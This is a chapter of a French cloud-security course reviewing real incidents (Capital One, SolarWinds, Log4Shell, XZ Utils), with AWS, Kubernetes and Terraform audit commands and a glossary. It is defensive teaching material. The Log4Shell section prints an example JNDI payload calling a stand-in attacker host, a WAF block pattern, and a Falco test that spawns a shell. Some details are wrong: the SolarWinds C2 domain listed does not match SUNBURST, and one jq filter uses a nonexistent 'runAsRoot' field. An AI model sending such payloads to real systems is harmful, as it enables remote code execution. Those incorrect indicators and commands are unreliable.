---
title: "15. Cas réels : incidents cloud majeurs"
---

# 15. Cas réels : incidents cloud majeurs

## Exposition de bucket S3 (capital one 2019)


| Données<br>exposées | 106 millions de clients nord-américains · Numéros de sécurité sociale · Numéros de<br>comptes bancaires · Cotes de crédit |
| --- | --- |
| Vecteur<br>d’attaque | SSRF (Server-Side Request Forgery) sur un WAF mal configuré → accès au service IMDS<br>(169.254.169.254) → vol des credentials IAM de l’EC2 |
| Cause<br>technique | Rôle IAM EC2 avec trop de permissions (accès S3 complet) + WAF ne bloquant pas les<br>requêtes SSRF vers 169.254.x.x |
| Impact<br>financier | Amende de 80M$ par l’OCC · Coût total estimé à 300M$ · Réputation endommagée · CISO<br>licencié |
| Remédiation | Activer IMDSv2 obligatoire · IAM least privilege · WAF rules bloquant SSRF · S3 Block<br>Public Access org-level · GuardDuty + Macie |
| Autres cas<br>similaires | GoDaddy (2021, 1.2M clients) · Twitch (2021, code source) · Samsung (2022, données<br>clients) · Toyota (2022, 2M véhicules) |


## SolarWinds supply chain attack (2020)

18 000 organisations infectées : Agences US gouvernementales, Microsoft, FireEye / Attribué : APT29 (Cozy Bear, SVR russe)

| Chaîne de compromission | Techniques d'attaque (MITRE ATT&CK) |
| --- | --- |
| •  Oct 2019 : accès initial au build system SolarWinds Orion<br>•  Oct-Nov 2019 : tests du backdoor sans payload (camouflage)<br>•  Fév 2020 : injection du malware SUNBURST dans DLL<br>Orion.Core.BusinessLayer.dll<br>•  Mars-Juin 2020 : 18 000 clients téléchargent la mise à jour infectée<br>(signée !)<br>•  Juin-Déc 2020 : exploitation discrète des organisations cibles (APT<br>long terme)<br>•  13 Déc 2020 : découverte par FireEye qui enquête sur sa propre<br>compromission | •  T1195.002 : Compromise Software Supply Chain (build pipeline)<br>•  T1553.002 : Code Signing (DLL signée avec certificat légitime Orion)<br>•  T1071.001 : C2 via HTTP/HTTPS (avoslocker.appsync-api.*.amazonaws.com)<br>•  T1562 : Defense Evasion : dormance 14j après install, imite le trafic légitime<br>Orion<br>•  T1550.001 : Token Impersonation : vol des tokens SAML Azure AD → accès<br>M365<br>•  T1119 : Automated Collection : exfiltration de mails et fichiers ciblés |
| Leçons et contrôles anti-supply-chain |  |
| •  SBOM obligatoire pour tous les logiciels tiers : aurait permis de détecter la modification de la DLL<br>•  Signature et vérification de build : reproductible builds · Binary Transparency · Cosign/Sigstore pour les artefacts<br>•  Isolation du build system : réseau séparé · pas d'accès Internet · MFA + PAM sur les serveurs de build<br>•  Détection réseau : alertes sur connexions DNS vers domaines générés algorithmiquement (DGA) · UEBA sur comportement applicatif<br>•  Principe du moindre privilège pour les tokens SAML : limiter la durée de vie et les scopes (évite le golden SAML attack) |  |


## Log4Shell cve-2021-44228 (décembre 2021)


| Mécanisme de la vulnérabilité | Détection et réponse |
| --- | --- |
| •  Log4j2 interprète les expressions JNDI (${jndi:ldap://...}) dans les<br>chaînes loguées<br>•  Un attaquant envoie ${jndi:ldap://attacker.com/exploit} dans un<br>champ logué (User-Agent, etc.)<br>•  Log4j2 fait une requête LDAP vers le serveur attaquant<br>•  Le serveur attaquant répond avec une classe Java malveillante<br>•  Log4j2 charge et exécute cette classe → RCE complète sur le serveur<br>•  Exploitation en <1 ligne · Détection initiale très difficile | •  WAF : bloquer les patterns ${jndi: dans tous les inputs HTTP<br>•  Network : bloquer les connexions LDAP/RMI sortantes non autorisées<br>•  Scanner : log4j-detector (Lunasec) · log4shell-detector · Huntress Log4Shell<br>Tester<br>•  Mitigation immédiate : LOG4J_FORMAT_MSG_NO_LOOKUPS=true (env var)<br>•  Correction permanente : upgrader vers Log4j 2.17.1+<br>•  SBOM : aurait permis de lister instantanément tous les services affectés |
| # Scanner toutes les images Docker pour Log4Shell<br># Option 1 : Grype (Anchore)<br>grype sbom:./sbom.json \| grep log4j<br># Option 2 : Trivy<br>trivy fs --severity CRITICAL --vuln-type library . un SBOM aurait permis de répondre à 'quels services utilisent<br>trivy image myapp:latest \| grep CVE-2021-44228<br>Log4j ?' en quelques secondes vs. jours d'investigation<br># Option 3 : log4j-detector (Lunasec)<br>java -jar log4j-detector.jar /opt/myapp /var/lib<br># Dans la CI/CD (GitHub Actions) :<br>- uses: anchore/scan-action@v3<br>with: { image: "myapp:latest", fail-build: "true", severity-cutoff: "critical" } |  |


## XZ Utils backdoor : Social engineering avancé (avril 2024)

Backdoor dans xz/liblzma (dépendance SSH sur Debian/Ubuntu/Fedora) · Découverte par hasard par un développeur Microsoft via un benchmark CPU

| Timeline de l'attaque (+ 2ans de préparation) | Mécanisme technique du backdoor |
| --- | --- |
| •  Juin 2021 : création du compte GitHub 'JiaT75' (fausse identité<br>soigneusement construite)<br>•  2022-2023 : contributions légitimes de qualité au projet xz pour gagner la<br>confiance du mainteneur<br>•  Fin 2023 : harcèlement coordonné du mainteneur principal (burn-out<br>orchestré) pour forcer une prise en charge<br>•  Jan-Fév 2024 : injection du backdoor dans les versions 5.6.0 et 5.6.1 de<br>xz/liblzma<br>•  Mars 2024 : Andres Freund (Microsoft) remarque une anomalie de 500ms<br>dans SSH via un benchmark perf → découverte<br>•  5 Avril 2024 : CVE-2024-3094 publiée (CVSS 10.0) : urgence nationale aux US | •  Le backdoor est injecté uniquement dans les tarballs de release (pas<br>dans Git directement)<br>•  Il cible spécifiquement sshd via la chaîne : xz → liblzma → systemd →<br>sshd<br>•  Objectif : permettre à l'attaquant de s'authentifier SSH sans credentials<br>valides<br>•  Détection ratée par : checksum du tarball valide (le code est dans les<br>tests !) · CI/CD ne scannait que Git<br>•  Impact potentiel : accès root sur des millions de serveurs Linux<br>mondiaux |
| Leçons pour les équipes DevSecOps |  |
| •  Reproduire les builds (reproducible builds)<br>•  Comparer le tarball au source Git / Scanner les tarballs et les sources<br>•  Vérifier l'intégrité des dépendances open source<br>•  Revues de code humaines sur les contributions critiques<br>•  SBOM avec sources vérifiées<br>•  Alertes sur changements de mainteneurs de projets critiques |  |


## Sécurité de la CLI AWS


| IAM : Audit et investigation | S3 : Sécurité des buckets |
| --- | --- |
| aws iam generate-credential-report && aws iam<br>get-credential-report \| base64 -d<br>aws iam list-users --query 'Users[?PasswordLastUsed==`null`]' #<br>users jamais connectés<br>aws iam list-access-keys --user-name USERNAME # lister les clés<br>d'un user<br>aws iam simulate-principal-policy --policy-source-arn ARN<br>--action-names 's3:*' # tester permissions | aws s3api get-bucket-acl --bucket BUCKET # vérifier les ACLs<br>aws s3api get-public-access-block --bucket BUCKET # état Block<br>Public Access<br>aws s3api put-public-access-block --bucket BUCKET<br>--public-access-block-configuration<br>'BlockPublicAcls=true,BlockPublicPolicy=true,IgnorePublicAcls=true,<br>RestrictPublicBuckets=true'<br>aws s3api get-bucket-encryption --bucket BUCKET # vérifier le<br>chiffrement |
| GuardDuty : Findings | CloudTrail : Logs forensiques |
| aws guardduty list-findings --detector-id ID # lister tous les<br>findings<br>aws guardduty get-findings --detector-id ID --finding-ids ID1<br>ID2 # détail<br>aws guardduty create-sample-findings --detector-id ID # générer<br>des findings de test<br>aws guardduty list-detectors # trouver l'ID du détecteur | •  aws cloudtrail lookup-events --lookup-attributes<br>AttributeKey=Username,AttributeValue=root # events root<br>•  aws cloudtrail lookup-events --start-time 2024-01-01 --query<br>'Events[?EventName==`ConsoleLogin`]'<br>•  aws cloudtrail get-trail-status --name TRAIL_NAME #<br>vérifier si actif<br>•  aws logs filter-log-events --log-group-name CloudTrail/logs<br>--filter-pattern 'errorCode' |


## Sécurité de Kubernetes


| RBAC : Audit des droits | Pods : Détection de mauvaises configs |
| --- | --- |
| kubectl auth can-i --list<br>--as=system:serviceaccount:default:mysa # ce que le SA peut<br>faire<br>kubectl get rolebindings,clusterrolebindings --all-namespaces -o<br>wide \| grep -v system:<br>kubectl get pods --all-namespaces -o json \| jq<br>'.items[].spec.serviceAccountName' # SA par pod<br>kubectl describe clusterrolebinding cluster-admin # qui a les<br>droits admin ? | kubectl get pods --all-namespaces -o json \| jq '.items[] \|<br>select(.spec.securityContext.runAsRoot==true)'<br>kubectl get pods -o json \| jq '.items[] \|<br>select(.spec.hostNetwork==true)' # pods avec hostNetwork<br>kubectl get pods -o json \| jq '.items[] \|<br>select(.spec.containers[].securityContext.privileged==true)'<br>kubectl get secrets --all-namespaces \| grep -v kubernetes.io #<br>secrets custom |
| GuardDuty : Findings | Falco : Détection runtime |
| kubectl get networkpolicies --all-namespaces # lister toutes<br>les network policies<br>kubectl describe networkpolicy default-deny -n production #<br>détail d'une policy<br># Namespaces sans network policy (dangereux) :<br>for ns in $(kubectl get ns -o<br>jsonpath='{.items[*].metadata.name}'); do echo $ns: $(kubectl<br>get networkpolicy -n $ns 2>/dev/null \| wc -l) policies; done | helm install falco falcosecurity/falco -n falco --create-namespace<br># installation<br>kubectl logs -l app=falco -n falco --tail=50 -f # suivre les<br>alertes<br>kubectl exec -it falco-pod -n falco -- falco --list \| grep shell #<br>règles disponibles<br># Test : spawner un shell dans un pod (doit déclencher Falco) :<br>kubectl exec -it mypod -- /bin/bash # → alerte Falco dans les logs |


## Sécurité Terraform et IaC


| tfsec : Scanner Terraform | Checkov : Multi-IaC Scanner |
| --- | --- |
| tfsec . --minimum-severity HIGH # scan sécurité du répertoire<br>courant<br>tfsec . --format sarif > results.sarif # output GitHub Security<br>tfsec . --include-ignored --soft-fail # voir aussi les ignores<br>tfsec . --custom-check-dir ./custom-rules # règles<br>personnalisées | checkov -d . --framework terraform # scanner Terraform<br>checkov -f Dockerfile --framework dockerfile # scanner Dockerfile<br>checkov -d . --check CKV_AWS_21,CKV_AWS_57 # checks spécifiques<br>seulement<br>checkov -d . --output sarif --output-file results.sarif # pour<br>GitHub |
| Conftest : Policy as Code | Trivy : Scan Images + IaC |
| conftest test main.tf --policy ./policies # valider un fichier<br>Terraform<br>conftest test deployment.yaml --policy ./k8s-policies # valider<br>K8s YAML<br>conftest verify --policy ./policies # vérifier les tests de<br>policies<br># Exemple politique Rego : interdire buckets S3 non chiffrés | trivy image myapp:latest --severity HIGH,CRITICAL # scan image<br>Docker<br>trivy fs . --scanners secret # détecter les secrets dans le code<br>trivy config . --severity HIGH # scan IaC (Terraform, K8s,<br>Dockerfile)<br>trivy sbom --format cyclonedx myapp:latest > sbom.json # générer<br>SBOM |


## De A à F : Termes et acronymes essentiels



## De G à Z : Termes et acronymes essentiels (suite)


| HSM | Hardware Security Module : module matériel dédié à la<br>protection des clés cryptographiques (FIPS 140-2 L3) | MFA | Multi-Factor Authentication : authentification<br>multi-facteurs : something you know + have + are |
| --- | --- | --- | --- |
| IaC | Infrastructure as Code : gestion de l'infrastructure via du<br>code (Terraform, CloudFormation, Ansible, Pulumi) | MITRE<br>ATT&CK | Knowledge base des tactiques, techniques et procédures<br>(TTPs) d’attaque observées en conditions réelles |
| IAM | Identity & Access Management : gestion des identités et des<br>droits d'accès aux ressources cloud | mTLS | Mutual TLS : authentification bidirectionnelle TLS où<br>client ET serveur présentent leur certificat |
| IdP | Identity Provider : fournisseur d’identité (Okta, Azure AD,<br>Ping) émettant des assertions SAML ou tokens OIDC | OIDC | OpenID Connect : couche d’identité sur OAuth 2.0<br>utilisant des tokens JWT (standard pour CI/CD<br>federation) |
| JIT | Just-In-Time : accès privilégié activé temporairement pour<br>une durée limitée avec approbation (Azure PIM, AWS SSO) | PAM | Privileged Access Management : gestion des accès<br>privilégiés avec enregistrement, approbation et durée<br>limitée |
| KMS | Key Management Service : service de gestion des clés de<br>chiffrement (AWS KMS, Azure Key Vault, Cloud KMS) | RBAC | Role-Based Access Control — contrôle d'accès basé sur<br>les rôles attribués aux utilisateurs |


## De G à Z : Termes et acronymes essentiels


| SBOM | Software Bill of Materials : inventaire exhaustif des<br>composants logiciels (format SPDX ou CycloneDX) | STS | Security Token Service (AWS) : service émettant des<br>credentials temporaires via AssumeRole / OIDC /<br>SAML |
| --- | --- | --- | --- |
| SIEM | Security Information & Event Management :<br>centralisation, normalisation, corrélation des logs<br>et alertes sécurité | UEBA | User & Entity Behavior Analytics : détection<br>d’anomalies comportementales par ML pour<br>utilisateurs et systèmes |
| SOAR | Security Orchestration, Automation & Response :<br>automatisation des workflows de réponse aux<br>incidents sécurité | VPC | Virtual Private Cloud : réseau virtuel isolé dans le<br>cloud provider (AWS VPC, Azure VNet, GCP VPC) |
| SOC | Security Operations Center : équipe dédiée à la<br>surveillance, détection et réponse aux incidents<br>24/7 | ZTNA | Zero Trust Network Access : accès réseau basé sur<br>l’identité et le contexte, remplace le VPN traditionnel |
| SSRF | Server-Side Request Forgery : vulnérabilité<br>permettant de forger des requêtes depuis le<br>serveur (ex : vers IMDS) |  |  |


| https://owasp.org/Top10/202 | 5 |
| --- | --- |
| https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-207.pdf |  |
| https://cloudsecurityalliance.org/artifacts/cloud-controls-matrix-v4-1 |  |

| https://tryhackme.com/path/outline/soclevel1 |
| --- |
| https://portswigger.net/web-security/all-labs |

| https://www.wiz.io/blog |
| --- |
| https://cloudsecurityalliance.org |
| https://krebsonsecurity.com |
| https://therecord.media |


## La sécurité n'est pas un état à atteindre,

c'est une pratique à maintenir.

